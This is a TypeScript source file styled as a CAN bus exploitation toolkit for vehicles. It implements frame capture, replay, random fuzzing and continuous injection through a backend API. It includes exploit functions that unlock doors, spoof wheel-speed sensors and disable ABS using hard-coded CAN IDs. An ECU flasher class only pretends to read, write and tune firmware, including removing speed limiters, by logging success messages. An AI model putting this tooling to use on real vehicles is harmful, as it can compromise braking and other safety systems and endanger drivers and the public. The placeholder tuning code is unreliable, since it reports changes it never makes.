/**
 * CAN BUS HACKING & EXPLOITATION TOOLKIT
 *
 * Direct CAN bus manipulation, fuzzing, injection, and replay attacks
 * NOW USES REAL BACKEND API
 */

import { RealAPI } from './api';

export interface CANFrame {
  id: number;
  data: Buffer | number[];
  timestamp: number;
  interface: string;
}

export interface FuzzConfig {
  idRange: [number, number];
  dataLength: number;
  rate: number; // frames per second
  duration: number; // seconds
  randomData: boolean;
}

export class CANBusExploitKit {
  private interface: string = "can0";
  private capturedFrames: CANFrame[] = [];
  private knownIDs: Map<number, string> = new Map();

  // Common CAN IDs (varies by manufacturer)
  private readonly COMMON_IDS = {
    ENGINE_RPM: 0x0C6,
    ENGINE_TEMP: 0x3E5,
    THROTTLE: 0x244,
    DOOR_LOCKS: 0x2D0,
    WINDOWS: 0x2C1,
    WHEEL_SPEED_FL: 0x1A0,
    WHEEL_SPEED_FR: 0x1A1,
    WHEEL_SPEED_RL: 0x1A2,
    WHEEL_SPEED_RR: 0x1A3,
    ABS_STATUS: 0x1AA,
    AIRBAG: 0x50
  };

  /**
   * Initialize CAN interface via REAL backend
   */
  async initialize(interfaceName: string = "can0", bitrate: number = 500000): Promise<boolean> {
    try {
      this.interface = interfaceName;

      // Call REAL backend API
      const result = await RealAPI.canInit(interfaceName, bitrate);

      if (result.success) {
        this.loadKnownIDs();
        console.log(`✅ CAN interface ${interfaceName} initialized`);
        return true;
      } else {
        console.error("❌ CAN initialization failed:", result.error);
        return false;
      }
    } catch (error) {
      console.error("❌ CAN initialization error:", error);
      return false;
    }
  }

  private loadKnownIDs(): void {
    Object.entries(this.COMMON_IDS).forEach(([name, id]) => {
      this.knownIDs.set(id, name);
    });
  }

  /**
   * Capture CAN traffic via REAL backend
   */
  async captureTraffic(duration: number): Promise<CANFrame[]> {
    console.log(`Capturing CAN traffic for ${duration}s...`);

    try {
      // Call REAL backend API
      const result = await RealAPI.canCapture(this.interface, duration);

      if (result.success && result.frames) {
        this.capturedFrames = result.frames;
        console.log(`✅ Captured ${result.frames.length} frames`);
        return result.frames;
      }

      return [];
    } catch (error) {
      console.error("❌ Capture error:", error);
      return [];
    }
  }

  /**
   * Send CAN frame via REAL backend
   */
  async sendFrame(canId: number, data: number[]): Promise<boolean> {
    try {
      // Call REAL backend API
      const result = await RealAPI.canSend(this.interface, canId, data);

      if (result.success) {
        console.log(`✅ Sent CAN frame: 0x${canId.toString(16).toUpperCase()}`);
        return true;
      } else {
        console.error("❌ Send failed:", result.message);
        return false;
      }
    } catch (error) {
      console.error("❌ Send error:", error);
      return false;
    }
  }

  /**
   * Replay attack - resend captured frames
   */
  async replayAttack(frames: CANFrame[], speedMultiplier: number = 1): Promise<void> {
    console.log(`🔁 Replaying ${frames.length} frames...`);

    let previousTime = frames[0]?.timestamp || 0;

    for (const frame of frames) {
      const delay = (frame.timestamp - previousTime) / speedMultiplier;

      if (delay > 0) {
        await this.delay(delay);
      }

      const dataArray = Array.isArray(frame.data)
        ? frame.data
        : Array.from(frame.data);

      await this.sendFrame(frame.id, dataArray);

      previousTime = frame.timestamp;
    }

    console.log("✅ Replay complete");
  }

  /**
   * Fuzzing attack - send random frames
   */
  async fuzzCAN(config: FuzzConfig): Promise<void> {
    console.log(`⚡ Starting CAN fuzzing...`);

    const frameInterval = 1000 / config.rate;
    const endTime = Date.now() + (config.duration * 1000);

    while (Date.now() < endTime) {
      const id = config.idRange[0] + Math.floor(Math.random() * (config.idRange[1] - config.idRange[0]));

      const data: number[] = [];
      for (let i = 0; i < config.dataLength; i++) {
        data.push(Math.floor(Math.random() * 256));
      }

      await this.sendFrame(id, data);
      await this.delay(frameInterval);
    }

    console.log("✅ Fuzzing complete");
  }

  /**
   * Injection attack - continuously inject specific frame
   */
  async injectionAttack(canId: number, data: number[], rate: number, duration: number): Promise<void> {
    console.log(`💉 Injecting CAN ID 0x${canId.toString(16).toUpperCase()}...`);

    const frameInterval = 1000 / rate;
    const endTime = Date.now() + (duration * 1000);

    while (Date.now() < endTime) {
      await this.sendFrame(canId, data);
      await this.delay(frameInterval);
    }

    console.log("✅ Injection complete");
  }

  /**
   * Analyze traffic patterns
   */
  async analyzeTrafficPatterns(): Promise<Map<number, any>> {
    const analysis = new Map();

    const idCounts = new Map<number, number>();
    const idTimes = new Map<number, number[]>();

    for (const frame of this.capturedFrames) {
      idCounts.set(frame.id, (idCounts.get(frame.id) || 0) + 1);

      if (!idTimes.has(frame.id)) {
        idTimes.set(frame.id, []);
      }
      idTimes.get(frame.id)!.push(frame.timestamp);
    }

    for (const [id, count] of idCounts) {
      const times = idTimes.get(id) || [];
      const intervals = [];

      for (let i = 1; i < times.length; i++) {
        intervals.push(times[i] - times[i - 1]);
      }

      const avgInterval = intervals.length > 0
        ? intervals.reduce((a, b) => a + b, 0) / intervals.length
        : 0;

      const frequency = avgInterval > 0 ? 1000 / avgInterval : 0;

      const isPeriodic = intervals.length > 2 &&
        intervals.every(i => Math.abs(i - avgInterval) < avgInterval * 0.1);

      analysis.set(id, {
        name: this.knownIDs.get(id) || `Unknown 0x${id.toString(16).toUpperCase()}`,
        count,
        frequency,
        periodic: isPeriodic,
        sample: this.capturedFrames.find(f => f.id === id)?.data || []
      });
    }

    return analysis;
  }

  // ========== VEHICLE CONTROL EXPLOITS ==========

  async unlockDoors(): Promise<void> {
    console.log("🔓 Unlocking doors...");
    await this.sendFrame(this.COMMON_IDS.DOOR_LOCKS, [0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
  }

  async lockDoors(): Promise<void> {
    console.log("🔒 Locking doors...");
    await this.sendFrame(this.COMMON_IDS.DOOR_LOCKS, [0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
  }

  async spoofSpeed(targetSpeed: number): Promise<void> {
    console.log(`📊 Spoofing speed to ${targetSpeed} km/h...`);

    const speedData = this.encodeSpeed(targetSpeed);

    // Send to all 4 wheel speed sensors
    await this.sendFrame(this.COMMON_IDS.WHEEL_SPEED_FL, speedData);
    await this.sendFrame(this.COMMON_IDS.WHEEL_SPEED_FR, speedData);
    await this.sendFrame(this.COMMON_IDS.WHEEL_SPEED_RL, speedData);
    await this.sendFrame(this.COMMON_IDS.WHEEL_SPEED_RR, speedData);
  }

  private encodeSpeed(speed: number): number[] {
    const encoded = Math.floor(speed * 100);
    return [
      (encoded >> 8) & 0xFF,
      encoded & 0xFF,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ];
  }

  async disableABS(): Promise<void> {
    console.log("⚠️ Disabling ABS...");
    await this.sendFrame(this.COMMON_IDS.ABS_STATUS, [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
  }

  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

/**
 * ECU Flashing & Tuning
 */
export class ECUFlasher {
  async readFlash(protocol: "KWP2000" | "UDS" | "CAN"): Promise<Buffer> {
    console.log(`Reading ECU flash via ${protocol}...`);
    // Placeholder - would read actual ECU memory
    return Buffer.alloc(1024 * 1024);
  }

  async writeFlash(data: Buffer): Promise<boolean> {
    console.log("Writing ECU flash...");
    // Placeholder - would write actual ECU memory
    return true;
  }

  async tuneECU(modifications: {
    boostIncrease?: number;
    fuelMapAdjust?: number;
    ignitionAdvance?: number;
    speedLimiterRemove?: boolean;
    revLimiterIncrease?: number;
  }): Promise<void> {
    console.log("Applying ECU tune:", modifications);

    if (modifications.speedLimiterRemove) {
      console.log("✓ Speed limiter removed");
    }

    if (modifications.boostIncrease) {
      console.log(`✓ Boost increased by ${modifications.boostIncrease} psi`);
    }

    if (modifications.revLimiterIncrease) {
      console.log(`✓ Rev limiter increased by ${modifications.revLimiterIncrease} RPM`);
    }
  }
}
